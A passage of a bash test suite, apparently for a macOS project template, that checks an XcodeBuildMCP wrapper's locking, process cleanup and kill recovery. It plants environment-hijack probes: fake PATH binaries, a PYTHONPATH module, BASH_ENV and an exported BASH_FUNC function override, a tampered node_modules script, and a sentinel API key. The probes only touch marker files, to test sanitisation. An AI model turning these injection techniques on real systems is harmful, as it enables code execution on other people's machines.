    -c user.email='template-smoke@example.invalid' \
    commit --allow-empty -qm 'same-tree checkpoint'
  after="$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")"
  [[ "$before" == "$after" ]] || return 1
  if bash -c '. "$1/scripts/lib.sh"; build_manifest_is_current' _ "$copy"; then
    echo "same-tree commit did not invalidate build provenance" >&2
    return 1
  fi
  if "$copy/scripts/preview-review.sh" Features "" "$export_dir" >"$log" 2>&1; then
    echo "same-tree commit did not invalidate Preview export provenance" >&2
    return 1
  fi
  grep -q 'fresh export Git HEAD no longer matches' "$log"
}

assert_xcodebuildmcp_lock_released() {
  local lock="$1"
  [[ -f "$lock" && ! -L "$lock" && "$(/usr/bin/stat -f %Lp "$lock")" == "600" ]] || return 1
  for _attempt in {1..200}; do
    if (
      exec 6>>"$lock"
      /usr/bin/lockf -s -t 0 6
    ); then
      return 0
    fi
    /bin/sleep 0.01
  done
  return 1
}

assert_xcodebuildmcp_lease_held() {
  local lease="$1" status
  [[ -f "$lease" && ! -L "$lease" && "$(/usr/bin/stat -f %Lp "$lease")" == "600" ]] || return 1
  set +e
  (
    exec 5<"$lease"
    /usr/bin/lockf -s -t 0 5
  )
  status=$?
  set -e
  [[ "$status" == 75 ]] || return 1
}

test_xcodebuildmcp_clean_install() (
  local bash_env candidate candidate_command client_log clients_valid command_name copy exported_printf fake_bin fake_python process_command
  local delay_relay delay_status discovery_marked first_fifo first_status first_wrapper progress_observed readiness_deadline relay_command shutdown_cancel shutdown_watchdog test_group test_shell_pid
  local generation index live_run npm_copy npm_tree orphan_run sanitized_mcp second_fifo second_status second_wrapper sentinel stale_run
  local third_discovery_marker third_fifo third_ready_marker third_stderr_fifo third_status third_wrapper version
  local -a client_logs groups roots runtimes wrapper_commands wrappers
  copy="$(fixture xcodebuildmcp-clean-install)"
  copy="$(cd "$copy" && pwd -P)"
  [[ ! -e "$copy/Tools/XcodeBuildMCP/node_modules" ]] || return 1
  mkdir -p "$copy/.build"
  chmod 700 "$copy/.build"

  chmod g+w "$copy/mise.toml"
  if "$copy/scripts/xcodebuildmcp.sh" --version \
    >"$copy/.build/xcodebuildmcp-writable.out" \
    2>"$copy/.build/xcodebuildmcp-writable.err"; then
    echo "XcodeBuildMCP accepted group-writable reviewed metadata." >&2
    return 1
  fi
  chmod g-w "$copy/mise.toml"
  ln "$copy/mise.lock" "$copy/mise.lock.alias"
  if "$copy/scripts/xcodebuildmcp.sh" --version \
    >"$copy/.build/xcodebuildmcp-hardlink.out" \
    2>"$copy/.build/xcodebuildmcp-hardlink.err"; then
    echo "XcodeBuildMCP accepted multiply linked reviewed metadata." >&2
    return 1
  fi
  rm "$copy/mise.lock.alias"

  fake_bin="$copy/.build/fake-bin"
  fake_python="$copy/.build/fake-python"
  mkdir -p "$fake_bin" "$fake_python"
  for command_name in mise shasum awk sort node npm python3 xcrun; do
    cat >"$fake_bin/$command_name" <<EOF
#!/bin/bash
/usr/bin/touch "$copy/.build/xcodebuildmcp-path-injection"
echo PATH-INJECTED
EOF
    chmod 700 "$fake_bin/$command_name"
  done
  cat >"$fake_python/selectors.py" <<EOF
from pathlib import Path
Path("$copy/.build/xcodebuildmcp-python-injection").touch()
raise RuntimeError("PYTHONPATH injection executed")
EOF
  bash_env="$copy/.build/bash-env"
  cat >"$bash_env" <<EOF
/usr/bin/touch "$copy/.build/xcodebuildmcp-bash-env-injection"
EOF
  exported_printf="() { /usr/bin/touch \"$copy/.build/xcodebuildmcp-function-injection\"; /usr/bin/printf \"\$@\"; }"
  sentinel="SWIFTMAC_MCP_ENV_$(uuidgen | tr -d '-')"
  sanitized_mcp="$(
    /usr/bin/env \
      BASH_ENV="$bash_env" \
      OPENAI_API_KEY="$sentinel" \
      PATH="$fake_bin:/usr/bin:/bin:/usr/sbin:/sbin" \
      PYTHONHOME="$fake_python" \
      PYTHONPATH="$fake_python" \
      "$copy/scripts/support/run_sanitized.sh" /usr/bin/xcrun --find mcpbridge
  )"
  [[ "$sanitized_mcp" == */mcpbridge ]] || return 1
  [[ "$sanitized_mcp" != *"$sentinel"* ]] || return 1
  [[ ! -e "$copy/.build/xcodebuildmcp-path-injection" ]] || return 1
  [[ ! -e "$copy/.build/xcodebuildmcp-python-injection" ]] || return 1
  [[ ! -e "$copy/.build/xcodebuildmcp-bash-env-injection" ]] || return 1

  mkdir -p "$copy/Tools/XcodeBuildMCP/node_modules/xcodebuildmcp/build"
  cat >"$copy/Tools/XcodeBuildMCP/node_modules/xcodebuildmcp/build/cli.js" <<EOF
#!/bin/bash
/usr/bin/touch "$copy/.build/xcodebuildmcp-cache-injection"
echo 2.6.2
EOF
  chmod 700 "$copy/Tools/XcodeBuildMCP/node_modules/xcodebuildmcp/build/cli.js"

  stale_run="$copy/.build/xcodebuildmcp-runs/run.99999999.staleproof"
  live_run="$copy/.build/xcodebuildmcp-runs/run.$$.liveproof"
  orphan_run="$copy/.build/xcodebuildmcp-runs/run.99999998.orphanproof"
  mkdir -p "$stale_run"
  mkdir -p "$live_run" "$orphan_run"
  chmod 700 "$stale_run" "$live_run" "$orphan_run"
  printf '%s\n' 99999999 >"$stale_run/owner"
  printf '%s\n' 99999999 >"$live_run/owner"
  printf '%s\n' "$$" >"$orphan_run/owner"
  chmod 600 "$stale_run/owner" "$live_run/owner" "$orphan_run/owner"

  npm_tree="$HOME/.local/share/mise/installs/node/24.16.0/lib/node_modules/npm"
  npm_copy="$copy/.build/npm-runtime-copy"
  /bin/cp -cR "$npm_tree" "$npm_copy"
  [[ "$(/usr/bin/python3 -I "$copy/scripts/support/tree_digest.py" "$npm_copy")" == "bc194478d828a5f7b0df29c4421ee216ea18fc80863264dbfe959228ae19fb26" ]] || return 1
  printf '\nthrow new Error("injected");\n' >>"$npm_copy/lib/cli.js"
  [[ "$(/usr/bin/python3 -I "$copy/scripts/support/tree_digest.py" "$npm_copy")" != "bc194478d828a5f7b0df29c4421ee216ea18fc80863264dbfe959228ae19fb26" ]] || return 1

  version="$(
    /usr/bin/env \
      BASH_ENV="$bash_env" \
      "BASH_FUNC_printf%%=$exported_printf" \
      PATH="$fake_bin:/usr/bin:/bin:/usr/sbin:/sbin" \
      PYTHONHOME="$fake_python" \
      PYTHONPATH="$fake_python" \
      "$copy/scripts/xcodebuildmcp.sh" --version \
      2>"$copy/.build/xcodebuildmcp-version.err"
  )"
  [[ "$version" == "2.6.2" ]] || return 1
  [[ ! -e "$stale_run" ]] || return 1
  [[ -d "$live_run" && -d "$orphan_run" ]] || return 1
  rm -rf "$live_run" "$orphan_run"
  [[ ! -e "$copy/.build/xcodebuildmcp-path-injection" ]] || return 1
  [[ ! -e "$copy/.build/xcodebuildmcp-python-injection" ]] || return 1
  [[ ! -e "$copy/.build/xcodebuildmcp-bash-env-injection" ]] || return 1
  [[ ! -e "$copy/.build/xcodebuildmcp-function-injection" ]] || return 1
  [[ ! -e "$copy/.build/xcodebuildmcp-cache-injection" ]] || return 1
  assert_xcodebuildmcp_lock_released "$copy/.build/xcodebuildmcp-install.lock"
  [[ "$(stat -f %Lp "$copy/.build/npm-cache")" == "700" ]] || return 1
  [[ "$(find "$copy/.build/xcodebuildmcp-runs" -mindepth 1 -maxdepth 1 -name 'run.*' | wc -l | tr -d ' ')" == "0" ]] || return 1

  first_fifo="$copy/.build/xcodebuildmcp-first.stdin"
  second_fifo="$copy/.build/xcodebuildmcp-second.stdin"
  third_fifo="$copy/.build/xcodebuildmcp-third.stdin"
  third_stderr_fifo="$copy/.build/xcodebuildmcp-third.stderr"
  third_discovery_marker="$copy/.build/xcodebuildmcp-third.discovered"
  third_ready_marker="$copy/.build/xcodebuildmcp-third.ready-line"
  mkfifo "$first_fifo" "$second_fifo" "$third_fifo" "$third_stderr_fifo"
  exec 7<>"$first_fifo"
  exec 8<>"$second_fifo"
  exec 9<>"$third_fifo"
  delay_relay=""
  relay_command=""
  shutdown_cancel=""
  shutdown_watchdog=""
  wrappers=()
  wrapper_commands=("" "" "")
  runtimes=("" "" "")
  roots=("" "" "")
  groups=("" "" "")
  test_shell_pid="$(/bin/sh -c '/bin/ps -p "$PPID" -o ppid=' | /usr/bin/tr -d ' ')"
  test_group="$(/bin/ps -p "$test_shell_pid" -o pgid= | /usr/bin/tr -d ' ')"
  [[ "$test_shell_pid" =~ ^[0-9]+$ && "$test_shell_pid" -gt 1 \
    && "$test_group" =~ ^[0-9]+$ && "$test_group" -gt 1 ]] || return 1

  xcodebuildmcp_test_pid_matches() {
    local current_command expected_command="$2" pid="$1"
    [[ "$pid" =~ ^[0-9]+$ && "$pid" -gt 1 && -n "$expected_command" ]] || return 1
    current_command="$(/bin/ps -ww -p "$pid" -o command= 2>/dev/null || true)"
    [[ "$current_command" == "$expected_command" ]] || return 1
  }

  xcodebuildmcp_test_owned_child() {
    local current_parent expected_command="$2" pid="$1"
    if [[ -n "$expected_command" ]]; then
      xcodebuildmcp_test_pid_matches "$pid" "$expected_command"
      return
    fi
    [[ "$pid" =~ ^[0-9]+$ && "$pid" -gt 1 ]] || return 1
    current_parent="$(/bin/ps -p "$pid" -o ppid= 2>/dev/null | /usr/bin/tr -d ' ')"
    [[ "$current_parent" == "$test_shell_pid" ]] || return 1
  }

  xcodebuildmcp_test_runtime_pid_matches() {
    local current_command current_group index="$1" pid root
    pid="${runtimes[$index]:-}"
    root="${roots[$index]:-}"
    [[ "$pid" =~ ^[0-9]+$ && "$pid" -gt 1 && -n "$root" ]] || return 1
    current_command="$(/bin/ps -ww -p "$pid" -o command= 2>/dev/null || true)"
    [[ "$current_command" == *"$root/node_modules/xcodebuildmcp/build/cli.js mcp"* ]] || return 1
    current_group="$(/bin/ps -p "$pid" -o pgid= 2>/dev/null | /usr/bin/tr -d ' ')"
    [[ "$current_group" == "$pid" && "$current_group" != "$test_group" ]] || return 1
  }

  xcodebuildmcp_test_runtime_matches() {
    local index="$1" pid root
    pid="${runtimes[$index]:-}"
    root="${roots[$index]:-}"
    xcodebuildmcp_test_runtime_pid_matches "$index" || return 1
    [[ "$(cat "$root/owner" 2>/dev/null || true)" == "$pid" ]] || return 1
  }

  cleanup_xcodebuildmcp_test_clients() {
    local child_command child_group cleanup_cancel cleanup_live cleanup_watchdog client_child client_pid index original_status=$?
    local -a cleanup_child_commands cleanup_child_groups cleanup_children
    trap - EXIT
    set +e
    set +u
    exec 7>&-
    exec 8>&-
    exec 9>&-
    if [[ -n "$shutdown_cancel" ]]; then
      /usr/bin/touch "$shutdown_cancel"
    fi
    if [[ "$shutdown_watchdog" =~ ^[0-9]+$ ]]; then
      wait "$shutdown_watchdog" 2>/dev/null || true
      shutdown_watchdog=""
      shutdown_cancel=""
    fi
    cleanup_children=()
    cleanup_child_commands=()
    cleanup_child_groups=()
    for index in 0 1 2; do
      client_pid="${wrappers[$index]:-}"
      xcodebuildmcp_test_owned_child "$client_pid" "${wrapper_commands[$index]:-}" || continue
      while IFS= read -r client_child; do
        [[ "$client_child" =~ ^[0-9]+$ ]] || continue
        child_command="$(/bin/ps -ww -p "$client_child" -o command= 2>/dev/null || true)"
        [[ -n "$child_command" ]] || continue
        child_group="$(/bin/ps -p "$client_child" -o pgid= 2>/dev/null | /usr/bin/tr -d ' ')"
        cleanup_children+=("$client_child")
        cleanup_child_commands+=("$child_command")
        cleanup_child_groups+=("$child_group")
      done < <(/usr/bin/pgrep -P "$client_pid" 2>/dev/null || true)
    done
    if xcodebuildmcp_test_owned_child "$delay_relay" "$relay_command"; then
      kill -TERM "$delay_relay" 2>/dev/null || true
      kill -CONT "$delay_relay" 2>/dev/null || true
    fi
    for index in 0 1 2; do
      client_pid="${wrappers[$index]:-}"
      xcodebuildmcp_test_owned_child "$client_pid" "${wrapper_commands[$index]:-}" || continue
      kill -TERM "$client_pid" 2>/dev/null || true
      kill -CONT "$client_pid" 2>/dev/null || true
    done
    for index in "${!cleanup_children[@]}"; do
      client_child="${cleanup_children[$index]}"
      [[ "$client_child" =~ ^[0-9]+$ ]] || continue
      xcodebuildmcp_test_pid_matches "$client_child" "${cleanup_child_commands[$index]}" || continue
      child_group="$(/bin/ps -p "$client_child" -o pgid= 2>/dev/null | /usr/bin/tr -d ' ')"
      if [[ "$child_group" == "$client_child" \
        && "$child_group" != "$test_group" && "$child_group" -gt 1 ]]; then
        kill -TERM -- "-$child_group" 2>/dev/null || true
        kill -CONT -- "-$child_group" 2>/dev/null || true
      else
        kill -TERM "$client_child" 2>/dev/null || true
        kill -CONT "$client_child" 2>/dev/null || true
      fi
    done
    for index in 0 1 2; do
      xcodebuildmcp_test_runtime_pid_matches "$index" || continue
      kill -TERM -- "-${runtimes[$index]}" 2>/dev/null || true
      kill -CONT -- "-${runtimes[$index]}" 2>/dev/null || true
    done
    cleanup_cancel="$copy/.build/xcodebuildmcp-cleanup-watchdog.cancel"
    /bin/rm -f "$cleanup_cancel"
    (
      trap '' HUP INT TERM
      for _watchdog_attempt in {1..1000}; do
        [[ -e "$cleanup_cancel" ]] && exit 0
        /bin/sleep 0.01
      done
      for index in "${!cleanup_children[@]}"; do
        client_child="${cleanup_children[$index]}"
        [[ "$client_child" =~ ^[0-9]+$ ]] || continue
        xcodebuildmcp_test_pid_matches "$client_child" "${cleanup_child_commands[$index]}" \
          || continue
        child_group="$(/bin/ps -p "$client_child" -o pgid= 2>/dev/null | /usr/bin/tr -d ' ')"
        if [[ "$child_group" == "$client_child" \
          && "$child_group" == "${cleanup_child_groups[$index]}" \
          && "$child_group" != "$test_group" && "$child_group" -gt 1 ]]; then
          kill -KILL -- "-$child_group" 2>/dev/null || true
        else
          kill -KILL "$client_child" 2>/dev/null || true
        fi
      done
      for index in 0 1 2; do
        xcodebuildmcp_test_runtime_pid_matches "$index" || continue
        kill -KILL -- "-${runtimes[$index]}" 2>/dev/null || true
      done
      for index in 0 1 2; do
        client_pid="${wrappers[$index]:-}"
        xcodebuildmcp_test_owned_child "$client_pid" "${wrapper_commands[$index]:-}" \
          || continue
        kill -KILL "$client_pid" 2>/dev/null || true
      done
      if xcodebuildmcp_test_owned_child "$delay_relay" "$relay_command"; then
        kill -KILL "$delay_relay" 2>/dev/null || true
      fi
    ) &
    cleanup_watchdog=$!
    for index in 0 1 2; do
      client_pid="${wrappers[$index]:-}"
      [[ "$client_pid" =~ ^[0-9]+$ ]] || continue
      wait "$client_pid" 2>/dev/null || true
      wrappers[$index]=""
      wrapper_commands[$index]=""
    done
    if [[ "$delay_relay" =~ ^[0-9]+$ ]]; then
      wait "$delay_relay" 2>/dev/null || true
      delay_relay=""
      relay_command=""
    fi
    cleanup_live=0
    for index in 0 1 2; do
      xcodebuildmcp_test_runtime_pid_matches "$index" && cleanup_live=1
    done
    for index in "${!cleanup_children[@]}"; do
      xcodebuildmcp_test_pid_matches \
        "${cleanup_children[$index]}" "${cleanup_child_commands[$index]}" \
        && cleanup_live=1
    done
    if [[ "$cleanup_live" == 1 ]]; then
      wait "$cleanup_watchdog" 2>/dev/null || true
    else
      /usr/bin/touch "$cleanup_cancel"
      wait "$cleanup_watchdog" 2>/dev/null || true
    fi
    exit "$original_status"
  }
  trap cleanup_xcodebuildmcp_test_clients EXIT

  /bin/bash -p -c '
    set -uo pipefail
    ready_marker="$1"
    discovery_marker="$2"
    while IFS= read -r line; do
      if [[ "$line" == *"Server running on stdio"* && ! -e "$ready_marker" ]]; then
        /usr/bin/touch "$ready_marker"
        deadline=$((SECONDS + 330))
        while [[ ! -e "$discovery_marker" && "$SECONDS" -lt "$deadline" ]]; do
          /bin/sleep 0.01
        done
        [[ -e "$discovery_marker" ]] || exit 1
        /bin/sleep 2
      fi
      /usr/bin/printf "%s\n" "$line"
    done
  ' _ "$third_ready_marker" "$third_discovery_marker" \
    <"$third_stderr_fifo" >"$copy/.build/xcodebuildmcp-third.err" \
    7>&- 8>&- 9>&- &
  delay_relay=$!
  PATH="$fake_bin:/usr/bin:/bin:/usr/sbin:/sbin" "$copy/scripts/xcodebuildmcp.sh" mcp \
    <"$first_fifo" >"$copy/.build/xcodebuildmcp-first.out" 2>"$copy/.build/xcodebuildmcp-first.err" \
    7>&- 8>&- 9>&- &
  first_wrapper=$!
  PATH="$fake_bin:/usr/bin:/bin:/usr/sbin:/sbin" "$copy/scripts/xcodebuildmcp.sh" mcp \
    <"$second_fifo" >"$copy/.build/xcodebuildmcp-second.out" 2>"$copy/.build/xcodebuildmcp-second.err" \
    7>&- 8>&- 9>&- &
  second_wrapper=$!
  PATH="$fake_bin:/usr/bin:/bin:/usr/sbin:/sbin" "$copy/scripts/xcodebuildmcp.sh" mcp \
    <"$third_fifo" >"$copy/.build/xcodebuildmcp-third.out" 2>"$third_stderr_fifo" \
    7>&- 8>&- 9>&- &
  third_wrapper=$!
  wrappers=("$first_wrapper" "$second_wrapper" "$third_wrapper")
  client_logs=(
    "$copy/.build/xcodebuildmcp-first.err"
    "$copy/.build/xcodebuildmcp-second.err"
    "$copy/.build/xcodebuildmcp-third.err"
  )
  shopt -s nullglob
  readiness_deadline=$((SECONDS + 330))
  clients_valid=0
  discovery_marked=0
  while [[ "$SECONDS" -lt "$readiness_deadline" ]]; do
    clients_valid=1
    progress_observed=0
    if ! kill -0 "$delay_relay" 2>/dev/null; then
      echo "XcodeBuildMCP readiness relay exited before readiness." >&2
      return 1
    fi
    if [[ -z "$relay_command" ]]; then
      process_command="$(/bin/ps -ww -p "$delay_relay" -o command= 2>/dev/null || true)"
      if [[ "$process_command" == *"$third_ready_marker"* ]]; then
        relay_command="$process_command"
      else
        clients_valid=0
      fi
    fi
    for index in 0 1 2; do
      if ! kill -0 "${wrappers[$index]}" 2>/dev/null; then
        echo "XcodeBuildMCP client $((index + 1)) exited before readiness." >&2
        return 1
      fi
      if [[ -z "${wrapper_commands[$index]}" ]]; then
        process_command="$(/bin/ps -ww -p "${wrappers[$index]}" -o command= 2>/dev/null || true)"
        if [[ "$process_command" == *"$copy/scripts/xcodebuildmcp.sh mcp"* ]]; then
          wrapper_commands[$index]="$process_command"
        else
          clients_valid=0
          continue
        fi
      elif ! xcodebuildmcp_test_pid_matches \
        "${wrappers[$index]}" "${wrapper_commands[$index]}"; then
        echo "XcodeBuildMCP client $((index + 1)) identity changed before readiness." >&2
        return 1
      fi
      if [[ -z "${runtimes[$index]}" ]]; then
        while IFS= read -r candidate; do
          candidate_command="$(/bin/ps -ww -p "$candidate" -o command= 2>/dev/null || true)"
          if [[ "$candidate_command" == *"/node_modules/xcodebuildmcp/build/cli.js mcp"* ]]; then
            for generation in "$copy/.build/xcodebuildmcp-runs"/run.*; do
              if [[ "$candidate_command" == *"$generation/"* ]]; then
                runtimes[$index]="$candidate"
                roots[$index]="$generation"
                progress_observed=1
                break 2
              fi
            done
          fi
        done < <(/usr/bin/pgrep -P "${wrappers[$index]}" 2>/dev/null || true)
      fi
      if [[ -z "${runtimes[$index]}" || -z "${roots[$index]}" ]]; then
        clients_valid=0
        continue
      fi
      if ! kill -0 "${runtimes[$index]}" 2>/dev/null; then
        echo "XcodeBuildMCP client $((index + 1)) runtime exited before readiness." >&2
        return 1
      fi
      xcodebuildmcp_test_runtime_matches "$index" || clients_valid=0
      groups[$index]="$(/bin/ps -p "${runtimes[$index]}" -o pgid= 2>/dev/null | /usr/bin/tr -d ' ')"
      assert_xcodebuildmcp_lease_held "${roots[$index]}/lease" || clients_valid=0
      client_log="${client_logs[$index]}"
      grep -q 'Server running on stdio' "$client_log" || clients_valid=0
    done
    if [[ "$discovery_marked" == 0 \
      && -n "${runtimes[0]}" && -n "${runtimes[1]}" && -n "${runtimes[2]}" ]]; then
      /usr/bin/touch "$third_discovery_marker"
      discovery_marked=1
    fi
    [[ -n "${roots[0]}" && -n "${roots[1]}" && -n "${roots[2]}" \
      && "${roots[0]}" != "${roots[1]}" \
      && "${roots[0]}" != "${roots[2]}" \
      && "${roots[1]}" != "${roots[2]}" ]] || clients_valid=0
    if [[ "$progress_observed" == 1 ]]; then
      readiness_deadline=$((SECONDS + 330))
    fi
    [[ "$clients_valid" == 1 ]] && break
    /bin/sleep 0.05
  done
  if [[ "$clients_valid" != 1 ]]; then
    echo "Three XcodeBuildMCP clients made no readiness progress for 330 seconds." >&2
    return 1
  fi

  xcodebuildmcp_test_runtime_matches 0 || return 1
  kill -STOP "${runtimes[0]}"
  for index in 0 1 2; do
    xcodebuildmcp_test_pid_matches \
      "${wrappers[$index]}" "${wrapper_commands[$index]}" || return 1
    kill -TERM "${wrappers[$index]}" 2>/dev/null || true
  done
  shutdown_cancel="$copy/.build/xcodebuildmcp-shutdown-watchdog.cancel"
  /bin/rm -f "$shutdown_cancel"
  (
    trap '' HUP INT TERM
    exec 7>&-
    exec 8>&-
    exec 9>&-
    for _watchdog_attempt in {1..1000}; do
      [[ -e "$shutdown_cancel" ]] && exit 0
      /bin/sleep 0.01
    done
    for index in 0 1 2; do
      xcodebuildmcp_test_runtime_pid_matches "$index" || continue
      kill -KILL -- "-${groups[$index]}" 2>/dev/null || true
    done
    for index in 0 1 2; do
      xcodebuildmcp_test_pid_matches \
        "${wrappers[$index]}" "${wrapper_commands[$index]}" || continue
      kill -KILL "${wrappers[$index]}" 2>/dev/null || true
    done
    if xcodebuildmcp_test_pid_matches "$delay_relay" "$relay_command"; then
      kill -KILL "$delay_relay" 2>/dev/null || true
    fi
  ) &
  shutdown_watchdog=$!
  first_status=0
  second_status=0
  third_status=0
  wait "$first_wrapper" || first_status=$?
  wrappers[0]=""
  wrapper_commands[0]=""
  wait "$second_wrapper" || second_status=$?
  wrappers[1]=""
  wrapper_commands[1]=""
  wait "$third_wrapper" || third_status=$?
  wrappers[2]=""
  wrapper_commands[2]=""
  delay_status=0
  wait "$delay_relay" || delay_status=$?
  delay_relay=""
  relay_command=""
  /usr/bin/touch "$shutdown_cancel"
  wait "$shutdown_watchdog" 2>/dev/null || true
  shutdown_watchdog=""
  shutdown_cancel=""
  exec 7>&-
  exec 8>&-
  exec 9>&-

  if [[ "$delay_status" != 0 || ! -f "$third_ready_marker" ]]; then
    echo "XcodeBuildMCP delayed-readiness relay did not finish cleanly." >&2
    return 1
  fi
  if [[ "$first_status" != 143 || "$second_status" != 143 || "$third_status" != 143 ]]; then
    echo "XcodeBuildMCP clients returned unexpected termination statuses." >&2
    return 1
  fi
  for index in 0 1 2; do
    if kill -0 "${runtimes[$index]}" 2>/dev/null \
      || kill -0 -- "-${groups[$index]}" 2>/dev/null; then
      echo "XcodeBuildMCP client process group survived termination." >&2
      return 1
    fi
  done
  runtimes=("" "" "")
  roots=("" "" "")
  groups=("" "" "")
  if [[ -e "$copy/.build/xcodebuildmcp-path-injection" \
    || -e "$copy/.build/xcodebuildmcp-cache-injection" ]]; then
    echo "XcodeBuildMCP client used an unreviewed executable path." >&2
    return 1
  fi
  if ! assert_xcodebuildmcp_lock_released "$copy/.build/xcodebuildmcp-install.lock"; then
    echo "XcodeBuildMCP install lock remained held after termination." >&2
    return 1
  fi
  if [[ "$(find "$copy/.build/xcodebuildmcp-runs" -mindepth 1 -maxdepth 1 -name 'run.*' | wc -l | tr -d ' ')" != "0" ]]; then
    echo "XcodeBuildMCP private runtime generations survived termination." >&2
    return 1
  fi
  trap - EXIT
)

test_xcodebuildmcp_install_signal_cleanup() {
  local candidate candidate_command child_group child_pid copy exited run_root signal_status wrapper_pid
  copy="$(fixture xcodebuildmcp-install-signal)"
  copy="$(cd "$copy" && pwd -P)"
  mkdir -p "$copy/.build"
  chmod 700 "$copy/.build"

  "$copy/scripts/xcodebuildmcp.sh" --version \
    >"$copy/.build/xcodebuildmcp-signal.out" \
    2>"$copy/.build/xcodebuildmcp-signal.err" &
  wrapper_pid=$!
  child_pid=""
  run_root=""
  shopt -s nullglob
  for _attempt in {1..500}; do
    while IFS= read -r candidate; do
      candidate_command="$(/bin/ps -p "$candidate" -o command= 2>/dev/null || true)"
      if [[ "$candidate_command" == *"scripts/support/run_with_timeout.py"* ]]; then
        child_pid="$candidate"
        for generation in "$copy/.build/xcodebuildmcp-runs"/run.*; do
          [[ "$(cat "$generation/owner" 2>/dev/null || true)" == "$child_pid" ]] && run_root="$generation"
        done
        [[ -n "$run_root" ]] && break 2
      fi
    done < <(/usr/bin/pgrep -P "$wrapper_pid" 2>/dev/null || true)
    /bin/sleep 0.005
  done
  [[ -n "$child_pid" && -n "$run_root" ]] || return 1
  child_group="$(/bin/ps -p "$child_pid" -o pgid= | /usr/bin/tr -d ' ')"
  [[ "$child_group" == "$child_pid" ]] || return 1
  assert_xcodebuildmcp_lease_held "$run_root/lease"

  kill -STOP "$child_pid"
  kill -TERM "$wrapper_pid"
  exited=0
  for _attempt in {1..500}; do
    if ! kill -0 "$wrapper_pid" 2>/dev/null; then
      exited=1
      break
    fi
    /bin/sleep 0.01
  done
  if [[ "$exited" != 1 ]]; then
    kill -TERM "$child_pid" "$wrapper_pid" 2>/dev/null || true
    wait "$wrapper_pid" 2>/dev/null || true
    echo "XcodeBuildMCP installer did not stop promptly." >&2
    return 1
  fi
  signal_status=0
  wait "$wrapper_pid" || signal_status=$?
  [[ "$signal_status" == "143" ]] || return 1
  ! kill -0 "$child_pid" 2>/dev/null || return 1
  ! kill -0 -- "-$child_group" 2>/dev/null || return 1
  assert_xcodebuildmcp_lock_released "$copy/.build/xcodebuildmcp-install.lock"
  [[ "$(find "$copy/.build/xcodebuildmcp-runs" -mindepth 1 -maxdepth 1 -name 'run.*' | wc -l | tr -d ' ')" == "0" ]] || return 1
}

test_xcodebuildmcp_kill_recovery() {
  local candidate candidate_command child_pid copy old_run replacement_pid replacement_status wrapper_pid wrapper_status
  copy="$(fixture xcodebuildmcp-kill-recovery)"
  copy="$(cd "$copy" && pwd -P)"
  mkdir -p "$copy/.build"
  chmod 700 "$copy/.build"

  "$copy/scripts/xcodebuildmcp.sh" --version \
    >"$copy/.build/xcodebuildmcp-killed.out" \
    2>"$copy/.build/xcodebuildmcp-killed.err" &
  wrapper_pid=$!
  child_pid=""
  old_run=""
  shopt -s nullglob
  for _attempt in {1..500}; do
    while IFS= read -r candidate; do
      candidate_command="$(/bin/ps -p "$candidate" -o command= 2>/dev/null || true)"
      if [[ "$candidate_command" == *"scripts/support/run_with_timeout.py"* ]]; then
        child_pid="$candidate"
        for generation in "$copy/.build/xcodebuildmcp-runs"/run.*; do
          [[ "$(cat "$generation/owner" 2>/dev/null || true)" == "$child_pid" ]] && old_run="$generation"
        done
        [[ -n "$old_run" ]] && break 2
      fi
    done < <(/usr/bin/pgrep -P "$wrapper_pid" 2>/dev/null || true)
    /bin/sleep 0.005
  done
  [[ -n "$child_pid" && -n "$old_run" ]] || return 1

  kill -STOP "$child_pid"
  kill -KILL "$wrapper_pid"
  wrapper_status=0
  wait "$wrapper_pid" || wrapper_status=$?
  [[ "$wrapper_status" == 137 ]] || return 1
  kill -0 "$child_pid"
  assert_xcodebuildmcp_lease_held "$old_run/lease"

  "$copy/scripts/xcodebuildmcp.sh" --version \
    >"$copy/.build/xcodebuildmcp-replacement.out" \
    2>"$copy/.build/xcodebuildmcp-replacement.err" &
  replacement_pid=$!
  /bin/sleep 0.2
  kill -0 "$replacement_pid"
  [[ -d "$old_run" ]] || return 1
  if assert_xcodebuildmcp_lock_released "$copy/.build/xcodebuildmcp-install.lock"; then
    kill -CONT "$child_pid" 2>/dev/null || true
    kill -TERM "$replacement_pid" 2>/dev/null || true
    wait "$replacement_pid" 2>/dev/null || true
    echo "XcodeBuildMCP crash released the live install lock too early." >&2
    return 1
  fi

  kill -CONT "$child_pid"
  replacement_status=0
  wait "$replacement_pid" || replacement_status=$?
  [[ "$replacement_status" == 0 ]] || return 1
  [[ "$(cat "$copy/.build/xcodebuildmcp-replacement.out")" == "2.6.2" ]] || return 1
  for _attempt in {1..200}; do
    ! kill -0 "$child_pid" 2>/dev/null && break
    /bin/sleep 0.01
  done
  ! kill -0 "$child_pid" 2>/dev/null || return 1
  [[ ! -e "$old_run" ]] || return 1
  [[ "$(find "$copy/.build/xcodebuildmcp-runs" -mindepth 1 -maxdepth 1 -name 'run.*' | wc -l | tr -d ' ')" == "0" ]] || return 1
  assert_xcodebuildmcp_lock_released "$copy/.build/xcodebuildmcp-install.lock"
}

test_xcodebuildmcp_runtime_kill_recovery() {
  local candidate candidate_command copy fifo old_run replacement runtime runtime_group wrapper wrapper_status
  copy="$(fixture xcodebuildmcp-runtime-kill-recovery)"
  copy="$(cd "$copy" && pwd -P)"
  mkdir -p "$copy/.build"
  chmod 700 "$copy/.build"
  fifo="$copy/.build/xcodebuildmcp-runtime.stdin"
  mkfifo "$fifo"
  exec 7<>"$fifo"

  "$copy/scripts/xcodebuildmcp.sh" mcp \
    <"$fifo" \
    >"$copy/.build/xcodebuildmcp-runtime.out" \
    2>"$copy/.build/xcodebuildmcp-runtime.err" &
  wrapper=$!
  runtime=""
  old_run=""
  shopt -s nullglob
  for _attempt in {1..900}; do
    while IFS= read -r candidate; do
      candidate_command="$(/bin/ps -p "$candidate" -o command= 2>/dev/null || true)"
      if [[ "$candidate_command" == *"/node_modules/xcodebuildmcp/build/cli.js mcp"* ]]; then
        runtime="$candidate"
        for generation in "$copy/.build/xcodebuildmcp-runs"/run.*; do
          [[ "$(cat "$generation/owner" 2>/dev/null || true)" == "$runtime" ]] && old_run="$generation"
        done
        [[ -n "$old_run" ]] && break 2
      fi
    done < <(/usr/bin/pgrep -P "$wrapper" 2>/dev/null || true)
    /bin/sleep 0.05
  done
  [[ -n "$runtime" && -n "$old_run" ]] || return 1
  runtime_group="$(/bin/ps -p "$runtime" -o pgid= | /usr/bin/tr -d ' ')"
  [[ "$runtime_group" == "$runtime" ]] || return 1
  /bin/sleep 1
  kill -0 "$wrapper"
  kill -0 "$runtime"
  assert_xcodebuildmcp_lease_held "$old_run/lease"

